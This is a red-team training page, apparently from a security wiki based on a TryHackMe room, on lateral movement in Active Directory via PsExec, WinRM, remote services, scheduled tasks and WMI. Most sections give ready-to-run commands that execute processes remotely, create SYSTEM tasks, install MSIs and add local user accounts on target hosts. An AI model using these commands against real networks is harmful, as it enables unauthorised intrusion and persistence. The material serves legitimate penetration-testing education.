# Pivoting

## Theory

In a red team assesment you will have to pivot throught the network. You will find here some technics about that like

* **Spawn a process remotly**: with PsExec, WinRM, SC (Services), Scheduled Tasks
* **WMI & Lateral Movement**: allows administrators to perform standard management tasks that attackers can abuse to perform lateral movement
* **Alternate Authentication Material**: like NTLM or Kerberos Authentication

## Practice

In this part, you will see various techniques, tools, for Active Directory enumeration. But you will consider that you already have compromise a initial account in the AD.

### PsExec

Psexec is one of many Sysinternals Tools and can be downloaded [here](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec), It connect to the $ADMIN shares with SMB and upload a service binary. Psexec uses psexesvc.exe as the name. Then it connect to the service control manager to create and run a service named PSEXESVC associated with the previous binary. Finally Psexec create some named pipes to handle stdin/stdout/stderr.

{% tabs %}
{% tab title="UNIX-like" %}
The [Impacket](https://github.com/SecureAuthCorp/impacket) script [psexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py) can exec a remote process.

```bash
psexec.py username:password@10.10.10.10 cmd.exe
```
{% endtab %}

{% tab title="Windows" %}
```bash
#Run PsExec
psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe
```
{% endtab %}
{% endtabs %}

### WinRm

Windows Remote Management (WinRM) is a web-based protocol used to send Powershell commands to Windows hosts remotely. Most Windows Server installations will have WinRM enabled by default, making it an attractive attack vector.

{% tabs %}
{% tab title="UNIX-like" %}
The [Evil-WinRm](https://github.com/Hackplayers/evil-winrm) can be used to obtain a winrm powershell session

```bash
evil-winrm -u user -p password -i 10.10.10.10
```
{% endtab %}

{% tab title="Windows" %}
We can use the WinRs binary

```bash
#Winrm Binary
winrs.exe -u:Administrator -p:Mypass123 -r:10.10.10.10 cmd
```

Or we can do the same with PowerShell

```bash
#Winrm Binary
#With PowerShell and PSCredential object
$username = 'Administrator';
$password = 'Mypass123';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; 
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;

#Now we can create an interactive session or Invoke-Command remotly
#Interactive Session
Enter-PSSession -Computername TARGET -Credential $credential

#Invoke command remotly
Invoke-Command -Computername TARGET -Credential $credential -ScriptBlock {whoami}
```
{% endtab %}
{% endtabs %}

### SC (Services)

Windows services can also be leveraged to run arbitrary commands since they execute a command when started. When using sc, it will try to connect to the Service Control Manager (SVCCTL) remote service program through RPC in several ways:

* By using DCE/RPC to connect EMP at port 135. WIll ask for the SVCCTL RPC Endpoint wich is a dynamic port
* Try to reach SVCCTL Through SMB named pipes on port 445 (SMB) or 139 (SMB over NetBIOS)

{% tabs %}
{% tab title="UNIX-like" %}
The [Impacket](https://github.com/SecureAuthCorp/impacket) script [service.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/service.py) and script [scshell.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/scshell.py)can be used to interact with services.

```bash
#Start a remote service
service.py domain/username:password@10.10.10.10 create [...]

#Create a service, get shell, delete service
scshell.py domain/username:password@10.10.10.10
```
{% endtab %}

{% tab title="Windows" %}
```bash
#Start a remote serviice
sc.exe \\TARGET create MyService binPath= "net user munra Pass123 /add" start= auto
sc.exe \\TARGET start MyService

#Stop and delete service
sc.exe \\TARGET stop MyService
sc.exe \\TARGET delete MyService
```
{% endtab %}
{% endtabs %}

### Creating Scheduled Tasks Remotely

Another Windows feature we can use is Scheduled Tasks. It allow us to create and run remote tasks. We can acces it over RPC and uses the Task Schedule Service to register a task.

{% tabs %}
{% tab title="UNIX-like" %}
The [Impacket](https://github.com/SecureAuthCorp/impacket) script [atexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py) can be used to interact with Tasks.

```bash
#Exec a scheduled command
atexec.py domain/username:password@10.10.10.10 "whoami"
```
{% endtab %}

{% tab title="Windows" %}
```bash
#Schedule a Task
schtasks /s TARGET /RU "SYSTEM" /create /tn "MyTask" /tr "<command/payload to execute>" /sc ONCE /sd 01/01/1970 /st 00:00 

#Run It 
schtasks /s TARGET /run /TN "THMtask1" 

#Delete a Task
schtasks /S TARGET /TN "THMtask1" /DELETE /F
```
{% endtab %}
{% endtabs %}

### WMI & Lateral Movement

Windows Management Instrumentation (WMI) allows administrators to perform standard management tasks that attackers can abuse to perform lateral movement

### Create a WMI Session

{% tabs %}
{% tab title="Windows" %}
{% hint style="info" %}
Before connecting to WMI through powershell, we need to create a PSCredential object
{% endhint %}

```bash
#Create a PSCredential object:

$username = 'Administrator';
$password = 'Mypass123';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
```

We can now connect to WMI through: DCOM protocol with RPC over port 135 or Wsman with WinRm on ports 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS).

```bash
#Create a WMI Session:

$Opt = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName TARGET -Credential $credential -SessionOption $Opt -ErrorAction Stop

#store the session on the $Session variable
```
{% endtab %}
{% endtabs %}

### Remote Process Creation Using WMI

{% tabs %}
{% tab title="UNIX-like" %}
The [Impacket](https://github.com/SecureAuthCorp/impacket) script [wmiexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py) can be used to create a process and get a shell to WMI.

```bash
#Exec a scheduled command
wmiexec.py domain/username:password@10.10.10.10
```
{% endtab %}

{% tab title="Windows" %}
{% hint style="info" %}
Before, we need to create a Cimsession object
{% endhint %}

```bash
#Execute a command remotely 
$Command = "powershell.exe -Command Set-Content -Path C:\text.txt -Value munrawashere";

Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{
CommandLine = $Command
}
```

Or with CMD

```bash
wmic.exe /user:Administrator /password:Mypass123 /node:TARGET process call create "cmd.exe /c calc.exe" 
```
{% endtab %}
{% endtabs %}

### Remote Service Creation Using WMI

{% tabs %}
{% tab title="Windows" %}
{% hint style="info" %}
Before, we need to create a Cimsession object
{% endhint %}

We first create the Service

```bash
Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{
Name = "MyService";
DisplayName = "MyService";
PathName = "net user munra2 Pass123 /add"; # Your payload
ServiceType = [byte]::Parse("16"); # Win32OwnProcess : Start service in a new process
StartMode = "Manual"
}
```

Then we Create an Handle to the service and Start it

```bash
$Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter "Name LIKE 'THMService2'"

Invoke-CimMethod -InputObject $Service -MethodName StartService
```

Finaly stop and delete it

```bash
Invoke-CimMethod -InputObject $Service -MethodName StopService
Invoke-CimMethod -InputObject $Service -MethodName Delete
```
{% endtab %}
{% endtabs %}

### Remote Scheduled Tasks Creation Using WMI

{% tabs %}
{% tab title="Windows" %}
{% hint style="info" %}
Before, we need to create a Cimsession object
{% endhint %}

```bash
# Payload must be split in Command and Args
$Command = "cmd.exe"
$Args = "/c net user munra22 aSdf1234 /add"

$Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command -Argument $Args
Register-ScheduledTask -CimSession $Session -Action $Action -User "NT AUTHORITY\SYSTEM" -TaskName "MyTask"
Start-ScheduledTask -CimSession $Session -TaskName "MyTask"
```

Delete it

```bash
Unregister-ScheduledTask -CimSession $Session -TaskName "THMtask2"
```
{% endtab %}
{% endtabs %}

### Remote MSI Installation Using WMI

{% tabs %}
{% tab title="Windows" %}
{% hint style="info" %}
Before, we need to create a Cimsession object
{% endhint %}

```bash
Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}
```

With CMD

```bash
wmic /node:TARGET /user:DOMAIN\USER product call install PackageLocation=c:\Windows\myinstaller.msi
```
{% endtab %}
{% endtabs %}

## Alternate Authentication Material

In this section, we will speak about alternate authentication like NTLM or Kerberos Authentication which allow us to access a Windows account without actually knowing a user’s password itself. You can check for more details on theses techniques on their dedicated Hack-Army articles.

{% content-ref url="kerberos/pass-the-certificate.md" %}
[pass-the-certificate.md](kerberos/pass-the-certificate.md)
{% endcontent-ref %}

{% content-ref url="ntlm/pth.md" %}
[pth.md](ntlm/pth.md)
{% endcontent-ref %}

{% content-ref url="kerberos/ptk.md" %}
[ptk.md](kerberos/ptk.md)
{% endcontent-ref %}

{% content-ref url="kerberos/ptt.md" %}
[ptt.md](kerberos/ptt.md)
{% endcontent-ref %}

{% content-ref url="../../portForward.md" %}
[portForward.md](../../portForward.md)
{% endcontent-ref %}

## References

{% embed url="https://tryhackme.com/room/lateralmovementandpivoting" %}
